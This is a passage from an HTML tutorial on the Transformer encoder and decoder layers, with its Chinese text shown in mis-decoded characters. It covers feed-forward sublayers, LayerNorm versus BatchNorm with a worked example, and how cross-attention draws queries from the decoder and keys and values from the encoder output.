<p><strong>å°æç¤ºï¼šå¦‚æœä½ ç»™æ¯ä¸ªè‡ªæ³¨æ„åŠ›å±‚çš„æ³¨æ„åŠ›æƒé‡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>åŠ äº†æ©ç ï¼Œé‚£ä¹ˆå°è£…æˆçš„å¤šå¤´æ³¨æ„åŠ›å°±å«åšMasked Multi Head Attentionã€‚æœ¬è´¨å®Œå…¨å’ŒMulti Head Attentionä¸€æ ·ï¼Œå°±æ˜¯æœ‰æ— æ©ç çš„åŒºåˆ«ã€‚</strong></p>
<hr/>
<p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬å¼€å§‹åŠ¨æ‰‹æ„å»ºTransformerçš„ç¼–ç å™¨æ¨¡å—ã€‚ä¸ä¹‹å‰ä»‹ç»çš„æ³¨æ„åŠ›æ¨¡å—ä¸€è„‰ç›¸æ‰¿ï¼Œ<strong>ç¼–ç å™¨å±‚çš„æ ¸å¿ƒåŠŸèƒ½åŒæ ·æ˜¯å°†ä¸€ä¸ªåºåˆ—è½¬æ¢ä¸ºå¦ä¸€ä¸ªåºåˆ—ï¼Œå¹¶ä¸”ä¿æŒè¾“å…¥ä¸è¾“å‡ºçš„ç»´åº¦ä¸€è‡´</strong>ã€‚ä¸‹å›¾æ¸…æ™°åœ°å±•ç¤ºäº†ä¸€ä¸ªæ ‡å‡†Transformerç¼–ç å™¨å±‚ï¼ˆTransformer Encoder Layerï¼‰çš„å†…éƒ¨ç»“æ„ï¼Œç›¸ä¿¡å¤§å®¶éƒ½èƒ½çœ‹æ‡‚ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b22f52a00419483ebd741452b65554fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=zAPZJj0MmYs8wkGEnRiFdzsFwmQ%3D" alt="c12.jpg" width="100%" loading="lazy"/></p>
<p>è§‚å¯Ÿè¿™ä¸ªç»“æ„å›¾ï¼Œä½ ä¼šå‘ç°å®ƒä¸»è¦ç”±ä¸¤å¤§æ ¸å¿ƒç»„ä»¶æ„æˆï¼š</p>
<ol>
<li><strong>å¤šå¤´è‡ªæ³¨æ„åŠ›å±‚ï¼ˆMulti-Head Self-Attentionï¼‰</strong>ï¼šè¿™å°±æ˜¯æˆ‘ä»¬ä¸Šä¸€èŠ‚æ‰€æ„å»ºçš„æ¨¡å—ï¼Œè´Ÿè´£è®©åºåˆ—ä¸­çš„æ¯ä¸ªä½ç½®éƒ½èƒ½æ±‡èšå…¨å±€çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</li>
<li><strong>å‰é¦ˆç¥ç»ç½‘ç»œå±‚ï¼ˆFeed-Forward Network, FFNï¼‰</strong>ï¼šä¸€ä¸ªåº”ç”¨äºæ¯ä¸ªä½ç½®ä¸Šçš„ç‹¬ç«‹ã€å…¨è¿æ¥ç½‘ç»œï¼Œè´Ÿè´£å¯¹æ±‡èšåçš„ä¿¡æ¯è¿›è¡Œéçº¿æ€§å˜æ¢å’Œæ·±å±‚å¤„ç†ã€‚</li>
</ol>
<p>è¿™ä¸¤ä¸ªæ ¸å¿ƒç»„ä»¶éƒ½è¢«**æ®‹å·®è¿æ¥ï¼ˆResidual Connectionï¼‰<strong>å’Œ</strong>å±‚å½’ä¸€åŒ–ï¼ˆLayer Normalizationï¼‰**æ‰€åŒ…è£¹ï¼Œå½¢æˆäº†â€œå­å±‚ -&gt; åŠ æ®‹å·® -&gt; å½’ä¸€åŒ–â€çš„ç¨³å®šè®¡ç®—å•å…ƒã€‚</p>
<p>è¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹ï¼Œå°±æ˜¯åœ¨çº¿æ€§å±‚Linearé‚£é‡Œï¼Œç¬¬ä¸€ä¸ªçº¿æ€§å±‚å°†è¾“å…¥å‘é‡çš„ç»´åº¦æ‰©å¤§åˆ°ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç»´åº¦<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">large\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>ï¼Œç¬¬äºŒä¸ªçº¿æ€§å±‚å†å°†å…¶å‹ç¼©å›åŸå§‹çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>ã€‚</p>
<p>ä½ å¯èƒ½è§‰å¾—å¾ˆå¥‡æ€ªï¼Œä¸ºä»€ä¹ˆè¦è¿™æ ·åšå‘¢ï¼Ÿå…¶å®åœ¨æ›´é«˜çš„ç»´åº¦ç©ºé—´ä¸­ï¼Œæ¨¡å‹èƒ½å¤Ÿå­¦ä¹ åˆ°æ›´å¤æ‚ã€æ›´ç»†å¾®çš„ç‰¹å¾ç»„åˆæ¨¡å¼ã€‚æ¨¡å‹ä»â€œçœ‹å±±æ˜¯å±±â€çš„é˜¶æ®µï¼Œåˆ°â€œçœ‹å±±ä¸æ˜¯å±±â€çš„é˜¶æ®µï¼Œæœ€ååˆå›åˆ°äº†â€œçœ‹å±±è¿˜æ˜¯å±±â€çš„é˜¶æ®µï¼Œè™½ç„¶çœ‹ä¼¼é¦–å°¾ç›¸åŒï¼Œå…¶å®ä¸¤ä¸ªçš„å¢ƒç•Œå·²ç»ä¸ä¸€æ ·äº†ã€‚å®ƒå·²ç»å®ç°äº†åœ¨æ›´é«˜å±‚æ¬¡ä¸Šçš„å›å½’ä¸å‡åã€‚</p>
<p>å¦å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„LayerNormå±‚ï¼Œå®ƒå’Œæˆ‘ä»¬å¸¸è§åˆ°çš„BatchNorméå¸¸ç›¸ä¼¼ï¼Œéƒ½æ˜¯å½’ä¸€åŒ–ï¼›äºŒè€…ç›®æ ‡ç›¸ä¼¼ï¼ˆåŠ é€Ÿè®­ç»ƒã€ç¨³å®šæ¢¯åº¦ï¼‰ï¼Œä½†ä½œç”¨ç»´åº¦æˆªç„¶ä¸åŒã€‚BatchNormæ˜¯å¯¹åŒä¸€ç‰¹å¾é€šé“ï¼Œè·¨ä¸åŒæ ·æœ¬è¿›è¡Œå½’ä¸€åŒ–ï¼Œè€ŒLayerNormå¯¹å•ä¸ªæ ·æœ¬ï¼Œè·¨ä¸åŒç‰¹å¾é€šé“è¿›è¡Œå½’ä¸€åŒ–ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç®€å•çš„æ•°æ®ï¼Œå½¢çŠ¶ä¸º <code>(batch_size=3, embed_size=4)</code>ï¼š</p>
<pre><code class="hljs language-python" lang="python">X = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>], 
     [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>],  
     [<span class="hljs-number">9</span>, <span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>]] 
</code></pre>
<ul>
<li><strong>æ‰¹å½’ä¸€åŒ–ï¼ˆBNï¼‰</strong> çš„æ“ä½œç»´åº¦ï¼šå¯¹äº<strong>ç¬¬ä¸€ä¸ªç‰¹å¾é€šé“</strong>ï¼ˆå³æ‰€æœ‰æ•°æ®çš„ç¬¬ä¸€ä¸ªæ•°å­—ï¼‰ï¼Œå®ƒä¼šæ”¶é›† <code>X[0,0]=1</code>, <code>X[1,0]=5</code>, <code>X[2,0]=9</code>è¿™3ä¸ªå€¼ï¼Œè®¡ç®—å®ƒä»¬çš„å‡å€¼ä¸æ–¹å·®ï¼Œç„¶åç”¨è¿™ä¸ªç»Ÿä¸€çš„åˆ†å¸ƒå»å½’ä¸€åŒ–è¿™3ä¸ªå€¼ã€‚å®ƒå¯¹æ¯ä¸ªç‰¹å¾é€šé“ç‹¬ç«‹è¿›è¡Œæ­¤æ“ä½œã€‚</li>
<li><strong>å±‚å½’ä¸€åŒ–ï¼ˆLNï¼‰</strong> çš„æ“ä½œç»´åº¦ï¼šå¯¹äº<strong>æ ·æœ¬1çš„ç¬¬ä¸€ä¸ªä½ç½®</strong> <code>X[0] = [1,2,3,4]</code>ï¼Œå®ƒä¼šè®¡ç®—è¿™ä¸ªé•¿åº¦ä¸º4çš„å‘é‡è‡ªèº«çš„å‡å€¼å’Œæ–¹å·®ï¼Œç„¶åç”¨è¿™ä¸ªå‡å€¼å’Œæ–¹å·®å»å½’ä¸€åŒ–è¿™ä¸ªå‘é‡æœ¬èº«ã€‚å®ƒå¯¹æ¯ä¸ªæ ·æœ¬çš„æ¯ä¸ªä½ç½®ç‹¬ç«‹è¿›è¡Œæ­¤æ“ä½œã€‚</li>
</ul>
<p>LayerNormåœ¨è¿™é‡Œçš„å¥½å¤„å°±æ˜¯æ— è®ºåºåˆ—å¤šé•¿ï¼Œå½’ä¸€åŒ–éƒ½åœ¨æ¯ä¸ªä½ç½®çš„å‘é‡å†…è¿›è¡Œï¼Œå› æ­¤å¤©ç”Ÿé€‚åº”å˜é•¿åºåˆ—ã€‚</p>
<hr/>
<p>å†æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬å¼€å§‹æ„å»º Transformer çš„<strong>è§£ç å™¨æ¨¡å—</strong>ã€‚è§£ç å™¨çš„æ ¸å¿ƒåŠŸèƒ½åŒæ ·æ˜¯<strong>å°†ä¸€ä¸ªåºåˆ—è½¬æ¢ä¸ºå¦ä¸€ä¸ªåºåˆ—</strong>ï¼Œä½†å®ƒä¸ç¼–ç å™¨æœ‰ä¸€ä¸ªå…³é”®åŒºåˆ«ï¼šè§£ç å™¨æ¥æ”¶<strong>ä¸¤ä¸ªè¾“å…¥</strong>ã€‚ä¸‹å›¾å±•ç¤ºäº†ä¸€ä¸ªæ ‡å‡† Transformer è§£ç å™¨å±‚ï¼ˆDecoder Layerï¼‰çš„å®Œæ•´ç»“æ„ã€‚ç›¸ä¿¡å¤§å®¶éƒ½èƒ½çœ‹æ‡‚ï¼Œå°±ä¸åšå…·ä½“è®²è§£äº†ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9cf15c665974a648bb03add1f84fb44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=Bs63OXk65noYGBow6AFtU0lJ8t4%3D" alt="c13.jpg" width="100%" loading="lazy"/></p>
<p>è¿™é‡Œéœ€è¦é¢å¤–å¼ºè°ƒï¼ŒåŸå§‹è¾“å…¥çŸ©é˜µ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>çš„å½¢çŠ¶å’Œè¾“å‡º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>çš„å½¢çŠ¶æ˜¯å®Œå…¨ç›¸åŒçš„ï¼Œåªä¸è¿‡è¿™ä¸ªé™„åŠ çš„è¾“å…¥<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå®ƒçš„ç»´åº¦å’Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>ç›¸åŒï¼Œä½†æ˜¯åºåˆ—é•¿åº¦å¯ä»¥ä¸ä¸€æ ·ã€‚ç›¸ä¿¡ä½ å·²ç»çœ‹å‡ºæ¥äº†ï¼Œè¿™ä¸ª<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>å°±æ˜¯ä¸Šä¸€èŠ‚æˆ‘ä»¬è®²çš„ç¼–ç å™¨çš„è¾“å‡ºã€‚</p>
<p>å¦å¤–ï¼Œæˆ‘ç›¸ä¿¡å¾ˆå¤šäººåœ¨<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>è¿™é‡Œå¾ˆå¾ˆå¤šä¸è§£ï¼Œæˆ‘å½“æ—¶å­¦ä¹ çš„æ—¶å€™å°±åœ¨è¿™ä¸ªåœ°æ–¹å¡äº†å¾ˆä¹…ï¼Œä¸çŸ¥é“<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>æ˜¯å¦‚ä½•è¾“å…¥åˆ°å¤šå¤´æ³¨æ„åŠ›ä¸­çš„ï¼Œæˆ‘æŠŠè¿™ä¸ªéƒ¨åˆ†çš„å¤šå¤´æ³¨æ„åŠ›æ¨¡å—è¿›è¡Œäº†æ‹†è§£ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12c35d3fabb34ef8a5b9e6a7a6997be5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=4QeV2q%2BTeRBenKpimycDgZgJwFA%3D" alt="c15.jpg" width="100%" loading="lazy"/></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼š</p>
<ul>
<li>æŸ¥è¯¢çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span> ç”±è§£ç å™¨è¾“å…¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> ç»è¿‡çº¿æ€§å˜æ¢å¾—åˆ°ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">Q = X W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚</li>
<li>é”®çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span> å’Œå€¼çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> åˆ™ç”±ç¼–ç å™¨è¾“å‡º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ç»è¿‡<strong>å„è‡ªç‹¬ç«‹</strong>çš„çº¿æ€§å˜æ¢å¾—åˆ°ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">K = Y_{out} W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>, <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">V = Y_{out} W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚</li>
</ul>
<p>æ­¤åçš„è®¡ç®—æµç¨‹ä¸æ ‡å‡†è‡ªæ³¨æ„åŠ›å®Œå…¨ç›¸åŒã€‚è¿™æ ·ä¸€æ¥ï¼Œè§£ç å™¨ä¸­çš„æ¯ä¸ªä½ç½®éƒ½èƒ½å¤Ÿæ ¹æ®è‡ªèº«çš„éœ€è¦ï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>ï¼‰ï¼Œæœ‰é€‰æ‹©åœ°ä»ç¼–ç å™¨è¾“å‡ºçš„æ‰€æœ‰ä½ç½®ï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo separator="true">,</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">K, V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" 